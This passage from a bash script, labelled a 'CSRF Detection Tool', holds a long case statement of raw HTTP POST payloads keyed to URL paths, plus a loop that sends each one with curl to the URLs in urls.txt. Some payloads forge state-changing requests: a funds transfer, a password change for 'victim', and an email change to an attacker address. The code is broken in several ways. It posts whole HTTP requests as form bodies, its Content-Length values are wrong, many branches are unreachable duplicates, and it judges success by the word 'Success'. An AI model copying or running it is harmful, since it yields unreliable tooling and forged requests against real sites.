        */add-idea)
            # Payload for adding an idea action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 29\r\n\r\nidea=Malicious%20Idea"
            ;;
        */create-diary)
            # Payload for creating a diary entry action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 37\r\n\r\ndiary_title=Malicious%20Diary&content=Malicious%20content"
            ;;
        */add-emotion)
            # Payload for adding an emotion action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 32\r\n\r\nemotion=Malicious%20Emotion"
            ;;
        */create-journal)
            # Payload for creating a journal entry action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 39\r\n\r\njournal_title=Malicious%20Journal&content=Malicious%20content"
            ;;
        */add-story)
            # Payload for adding a story action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 32\r\n\r\nstory=Malicious%20Story"
            ;;
        */create-recipe)
            # Payload for creating a recipe action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 37\r\n\r\nrecipe_title=Malicious%20Recipe&ingredients=Ingredient1,Ingredient2"
            ;;
        */add-ingredient)
            # Payload for adding an ingredient action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 34\r\n\r\ningredient=Malicious%20Ingredient"
            ;;
        */create-playlist)
            # Payload for creating a playlist action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 37\r\n\r\nplaylist_title=Malicious%20Playlist&songs=Song1,Song2"
            ;;
        */add-song)
            # Payload for adding a song action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 30\r\n\r\nsong=Malicious%20Song"
            ;;
        */create-memo)
            # Payload for creating a memo action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 34\r\n\r\nmemo_title=Malicious%20Memo&content=Malicious%20content"
            ;;
        */add-voice-note)
            # Payload for adding a voice note action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: audio/mpeg\r\nContent-Length: 1234\r\n\r\n<Malicious audio data>"
            ;;
        */create-challenge)
            # Payload for creating a challenge action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 41\r\n\r\nchallenge_title=Malicious%20Challenge&description=Malicious%20description"
            ;;
        */add-question)
            # Payload for adding a question action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 33\r\n\r\nquestion=Malicious%20Question"
            ;;
        */create-exam)
            # Payload for creating an exam action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 36\r\n\r\nexam_title=Malicious%20Exam&questions=Q1,Q2,Q3"
            ;;
        */add-answer)
            # Payload for adding an answer action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 33\r\n\r\nanswer=Malicious%20Answer"
            ;;
        */create-quiz)
            # Payload for creating a quiz action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 35\r\n\r\nquiz_title=Malicious%20Quiz&questions=Q1,Q2,Q3"
            ;;
        */add-choice)
            # Payload for adding a choice action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 32\r\n\r\nchoice=Malicious%20Choice"
            ;;
        */create-petition)
            # Payload for creating a petition action (alternative)
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 38\r\n\r\npetition_title=Malicious%20Petition&description=Malicious%20description"
            ;;
        */add-comment)
            # Payload for adding a comment action (alternative)
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 32\r\n\r\ncomment=Malicious%20Comment"
            ;;
        */create-thread)
            # Payload for creating a thread action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 34\r\n\r\nthread_title=Malicious%20Thread&content=Malicious%20content"
            ;;
        */add-reply)
            # Payload for adding a reply action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 31\r\n\r\nreply=Malicious%20Reply"
            ;;
        */create-conversation)
            # Payload for creating a conversation action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 40\r\n\r\nconversation_title=Malicious%20Conversation&participants=User1,User2"
            ;;
        */add-message)
            # Payload for adding a message action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 32\r\n\r\nmessage=Malicious%20Message"
            ;;
        */create-poll)
            # Payload for creating a poll action (alternative)
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 38\r\n\r\ntitle=Malicious%20Poll&options=Option1,Option2"
            ;;
        */add-vote)
            # Payload for adding a vote action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 29\r\n\r\nvote=Malicious%20Vote"
            ;;
        */create-subscription)
            # Payload for creating a subscription action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 43\r\n\r\nsubscription_title=Malicious%20Subscription&plan=Premium"
            ;;
        */add-comment)
            # Payload for adding a comment action (alternative)
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 32\r\n\r\ncomment=Malicious%20Comment"
            ;;
        */create-faq)
            # Payload for creating an FAQ entry action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 31\r\n\r\nquestion=Malicious%20Question&answer=Malicious%20Answer"
            ;;
        */add-review)
            # Payload for adding a review action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 34\r\n\r\nreview=Malicious%20Review&rating=5"
            ;;
        */submit-feedback)
            # Payload for submitting feedback action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 33\r\n\r\nfeedback=Malicious%20Feedback"
            ;;
        */apply-discount)
            # Payload for applying a discount action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 33\r\n\r\ndiscount_code=Malicious%20Code"
            ;;
        */schedule-appointment)
            # Payload for scheduling an appointment action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 40\r\n\r\nappointment_date=2024-02-21&time=10:00AM"
            ;;
        */apply-coupon)
            # Payload for applying a coupon action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 32\r\n\r\ncoupon_code=Malicious%20Coupon"
            ;;
        */add-review)
            # Payload for adding a review action (alternative)
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 34\r\n\r\nreview=Malicious%20Review&rating=5"
            ;;
        */submit-form)
            # Payload for submitting a form action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 33\r\n\r\nform_data=Malicious%20Data"
            ;;
        */apply-promo)
            # Payload for applying a promo action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 32\r\n\r\npromo_code=Malicious%20Code"
            ;;
        */upload-file)
            # Payload for uploading a file action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Length: 213\r\n\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"file\"; filename=\"malicious_file.txt\"\r\nContent-Type: text/plain\r\n\r\n<Malicious content>\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--"
            ;;
        */transfer-funds)
            # Payload for transferring funds action (alternative)
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 38\r\n\r\nfrom_account=attacker-account&to_account=victim-account&amount=1000"
            ;;
        */purchase)
            # Payload for making a purchase action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 27\r\n\r\nitem=malicious-item&price=100"
            ;;
        */change-password)
            # Payload for changing password action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 37\r\n\r\nusername=victim&password=malicious-pass"
            ;;
        */add-contact)
            # Payload for adding a contact action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 29\r\n\r\nname=Malicious%20Contact&number=1234567890"
            ;;
        */send-message)
            # Payload for sending a message action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/json\r\nContent-Length: 35\r\n\r\n{\"to\":\"victim\",\"message\":\"Malicious Message\"}"
            ;;
        */post-status)
            # Payload for posting a status action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: text/plain\r\nContent-Length: 19\r\n\r\nMalicious Status Post"
            ;;
        */upload-file)
            # Payload for uploading a file action (alternative)
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: multipart/form-data; boundary=---------------------------1234567890\r\nContent-Length: 266\r\n\r\n-----------------------------1234567890\r\nContent-Disposition: form-data; name=\"file\"; filename=\"malicious.txt\"\r\nContent-Type: text/plain\r\n\r\nMalicious File Content\r\n-----------------------------1234567890--"
            ;;
        */update-profile)
            # Payload for updating profile action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/json\r\nContent-Length: 43\r\n\r\n{\"username\":\"victim\",\"email\":\"malicious@attacker.com\"}"
            ;;
        */add-calendar-event)
            # Payload for adding a calendar event action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/json\r\nContent-Length: 46\r\n\r\n{\"title\":\"Malicious Event\",\"date\":\"2024-02-21\"}"
            ;;
        */create-project)
            # Payload for creating a project action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/json\r\nContent-Length: 36\r\n\r\n{\"name\":\"Malicious Project\",\"budget\":10000}"
            ;;
        */send-email)
            # Payload for sending an email action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: text/plain\r\nContent-Length: 30\r\n\r\nTo: victim@example.com\r\nSubject: Malicious Email\r\nBody: This is a malicious email."
            ;;
        */create-task)
            # Payload for creating a task action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/json\r\nContent-Length: 33\r\n\r\n{\"title\":\"Malicious Task\",\"due\":\"2024-02-21\"}"
            ;;
        */add-to-cart)
            # Payload for adding to cart action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/json\r\nContent-Length: 32\r\n\r\n{\"item\":\"malicious-item\",\"price\":100}"
            ;;
        */submit-form)
            # Payload for submitting a form action (alternative)
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: multipart/form-data; boundary=---------------------------1234567890\r\nContent-Length: 165\r\n\r\n-----------------------------1234567890\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\nMalicious Form\r\n-----------------------------1234567890\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\nmalicious@example.com\r\n-----------------------------1234567890\r\nContent-Disposition: form-data; name=\"message\"\r\n\r\nMalicious Message\r\n-----------------------------1234567890--"
            ;;
        */apply-filter)
            # Payload for applying a filter action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/json\r\nContent-Length: 31\r\n\r\n{\"filter\":\"malicious-filter\"}"
            ;;
        */create-poll)
            # Payload for creating a poll action (alternative)
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/json\r\nContent-Length: 37\r\n\r\n{\"question\":\"Malicious Poll\",\"options\":[\"Option1\",\"Option2\"]}"
            ;;
        */submit-quiz)
            # Payload for submitting a quiz action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: text/plain\r\nContent-Length: 30\r\n\r\nQuiz Answer: Malicious Answer"
            ;;
        */apply-promotion)
            # Payload for applying a promotion action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/json\r\nContent-Length: 34\r\n\r\n{\"promo\":\"malicious-promo-code\"}"
            ;;
        */subscribe-newsletter)
            # Payload for subscribing to newsletter action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: text/plain\r\nContent-Length: 24\r\n\r\nEmail: malicious@example.com"
            ;;
        */create-survey)
            # Payload for creating a survey action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: text/plain\r\nContent-Length: 28\r\n\r\nSurvey: Malicious Survey Name"
            ;;
        */add-voucher)
            # Payload for adding a voucher action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: text/plain\r\nContent-Length: 29\r\n\r\nVoucher: malicious-voucher-code"
            ;;
        */make-appointment)
            # Payload for making an appointment action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: text/plain\r\nContent-Length: 41\r\n\r\nDate: 2024-02-21\nTime: 10:00 AM"
            ;;
        */apply-discount)
            # Payload for applying a discount action (alternative)
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: text/plain\r\nContent-Length: 32\r\n\r\nDiscount Code: malicious-code"
            ;;
        */submit-feedback)
            # Payload for submitting feedback action (alternative)
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: text/plain\r\nContent-Length: 33\r\n\r\nFeedback: Malicious Feedback Text"
            ;;
        */apply-coupon)
            # Payload for applying a coupon action (alternative)
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: text/plain\r\nContent-Length: 32\r\n\r\nCoupon: malicious-coupon-code"
            ;;
        */join-event)
            # Payload for joining an event action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: text/plain\r\nContent-Length: 23\r\n\r\nEventID: malicious-event-id"
            ;;
        */register)
            # Payload for registration action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: text/plain\r\nContent-Length: 45\r\n\r\nUsername: malicious_user\nPassword: malicious_pass"
            ;;
        */create-list)
            # Payload for creating a list action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: text/plain\r\nContent-Length: 30\r\n\r\nList Name: Malicious List Name"
            ;;
        */add-link)
            # Payload for adding a link action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: text/plain\r\nContent-Length: 27\r\n\r\nURL: malicious-link-url"
            ;;
        */create-document)
            # Payload for creating a document action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: text/plain\r\nContent-Length: 32\r\n\r\nTitle: Malicious Document Title"
            ;;
        */add-task)
            # Payload for adding a task action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: text/plain\r\nContent-Length: 25\r\n\r\nTask: Malicious Task Name"
            ;;
        */apply-rating)
            # Payload for applying a rating action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: text/plain\r\nContent-Length: 25\r\n\r\nRating: 5"
            ;;
        */create-meeting)
            # Payload for creating a meeting action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: text/plain\r\nContent-Length: 31\r\n\r\nMeeting: Malicious Meeting Name"
            ;;
        */send-invitation)
            # Payload for sending an invitation action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: text/plain\r\nContent-Length: 35\r\n\r\nTo: victim@example.com\nEvent: Malicious Event"
            ;;
        */create-thread)
            # Payload for creating a thread action (alternative)
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: text/plain\r\nContent-Length: 34\r\n\r\nThread: Malicious Thread Title"
            ;;
        */add-reply)
            # Payload for adding a reply action (alternative)
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: text/plain\r\nContent-Length: 31\r\n\r\nReply: Malicious Reply Content"
            ;;
        */create-conversation)
            # Payload for creating a conversation action (alternative)
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: text/plain\r\nContent-Length: 40\r\n\r\nConversation: Malicious Conversation Title"
            ;;
        */send-message)
            # Payload for sending a message action (alternative)
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: text/plain\r\nContent-Length: 32\r\n\r\nMessage: Malicious Message Content"
            ;;
        */create-poll)
            # Payload for creating a poll action (alternative)
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: text/plain\r\nContent-Length: 38\r\n\r\nPoll: Malicious Poll Question\nOptions: Option1, Option2"
            ;;
        */add-vote)
            # Payload for adding a vote action (alternative)
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: text/plain\r\nContent-Length: 29\r\n\r\nVote: Malicious Vote Option"
            ;;
        */create-subscription)
            # Payload for creating a subscription action (alternative)
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: text/plain\r\nContent-Length: 43\r\n\r\nSubscription: Malicious Subscription Name\nPlan: Premium"
            ;;
        */add-comment)
            # Payload for adding a comment action (alternative)
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: text/plain\r\nContent-Length: 32\r\n\r\nComment: Malicious Comment Content"
            ;;
        */create-faq)
            # Payload for creating an FAQ entry action (alternative)
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: text/plain\r\nContent-Length: 31\r\n\r\nQuestion: Malicious Question Content\nAnswer: Malicious Answer Content"
            ;;
        */add-review)
            # Payload for adding a review action (alternative)
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: text/plain\r\nContent-Length: 34\r\n\r\nReview: Malicious Review Content\nRating: 5"
            ;;
        */submit-feedback)
            # Payload for submitting feedback action (alternative)
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: text/plain\r\nContent-Length: 33\r\n\r\nFeedback: Malicious Feedback Text"
            ;;
        */apply-discount)
            # Payload for applying a discount action (alternative)
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: text/plain\r\nContent-Length: 33\r\n\r\nDiscount Code: malicious-code"
            ;;
        */schedule-appointment)
            # Payload for scheduling an appointment action (alternative)
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: text/plain\r\nContent-Length: 40\r\n\r\nAppointment Date: 2024-02-21\nTime: 10:00 AM"
            ;;
        */apply-coupon)
            # Payload for applying a coupon action (alternative)
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: text/plain\r\nContent-Length: 32\r\n\r\nCoupon: malicious-coupon-code"
            ;;
        */add-review)
            # Payload for adding a review action (alternative)
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: text/plain\r\nContent-Length: 34\r\n\r\nReview: Malicious Review Content\nRating: 5"
            ;;
        */submit-form)
            # Payload for submitting a form action (alternative)
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: multipart/form-data; boundary=---------------------------1234567890\r\nContent-Length: 165\r\n\r\n-----------------------------1234567890\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\nMalicious Form\r\n-----------------------------1234567890\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\nmalicious@example.com\r\n-----------------------------1234567890\r\nContent-Disposition: form-data; name=\"message\"\r\n\r\nMalicious Message\r\n-----------------------------1234567890--"
            ;;
        */apply-promo)
            # Payload for applying a promo action (alternative)
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: text/plain\r\nContent-Length: 32\r\n\r\nPromo Code: malicious-code"
            ;;
        */upload-file)
            # Payload for uploading a file action (alternative)
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: multipart/form-data; boundary=---------------------------1234567890\r\nContent-Length: 266\r\n\r\n-----------------------------1234567890\r\nContent-Disposition: form-data; name=\"file\"; filename=\"malicious.txt\"\r\nContent-Type: text/plain\r\n\r\nMalicious File Content\r\n-----------------------------1234567890--"
            ;;
        *)
            # Default payload if no specific pattern matches
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 0\r\n\r\n"
            ;;
    esac

    echo "$payload"
}

# Function to perform CSRF detection
detect_csrf() {
    local url="$1"
    echo "Testing CSRF vulnerability for URL: $url"

    # Get the payload for the URL
    local payload=$(get_payload "$url")
    
    # Send request with the determined payload
    echo "Sending request with payload: $payload"
    local response=$(curl -s -X POST -d "$payload" "$url")
    echo "Response: $response"
    
    # Check if response indicates successful CSRF attack
    if [[ "$response" == *"Success"* ]]; then
        echo "Potential CSRF vulnerability found!"
        echo "To regenerate the vulnerability, perform the following steps:"
        echo "1. Log in to the victim site as a legitimate user."
        echo "2. Visit the attacker-controlled page or submit the crafted form."
        echo "3. The action should occur without requiring any further authentication."
        read -p "Do you want to continue testing for other URLs? (Y/N): " choice
        if [[ "$choice" != "Y" && "$choice" != "y" ]]; then
            exit 0
        fi
        return  # Stop testing if vulnerability found
    fi

    echo "No CSRF vulnerability found for URL: $url"
}

# Main function
main() {
    echo "CSRF Detection Tool"
    echo "-------------------"

    # Check if urls.txt exists
    if [ ! -f "urls.txt" ]; then
        echo "Error: File 'urls.txt' not found."
        exit 1
    fi

    # Read URLs from urls.txt and test each one
    while IFS= read -r url; do
        detect_csrf "$url"
        echo "==========================================="
    done < "urls.txt"
}

# Call main function
main
